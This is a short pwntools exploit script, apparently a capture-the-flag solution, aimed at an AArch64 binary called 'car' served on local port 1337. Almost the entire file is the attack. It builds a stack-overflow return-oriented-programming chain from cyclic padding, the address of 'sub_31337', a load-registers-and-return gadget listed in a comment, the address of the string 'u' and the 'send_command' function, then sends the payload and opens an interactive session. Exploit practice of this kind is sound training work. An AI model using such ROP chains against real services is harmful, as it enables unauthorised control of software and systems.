from pwn import *

binary = './car'
HOST = '127.0.0.1'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, 1337)
    else:
        return process(e.path)

'''
0x400d4c  e007c1a8   ldp     x0, x1, [sp], #0x10 {arg1} {arg2}
0x400d50  fd7bc1a8   ldp     x29, x30, [sp], #0x10 {arg3} {arg_18}
0x400d54  c0035fd6   ret     
'''

p = start()

CMD  = b'u\x00'

payload = cyclic(24)
payload += p64(e.sym['sub_31337'])
payload += cyclic(16)
payload += p64(next(e.search(CMD)))
payload += cyclic(16)
payload += p64(e.sym['send_command'])

p.sendline(payload)

p.interactive()
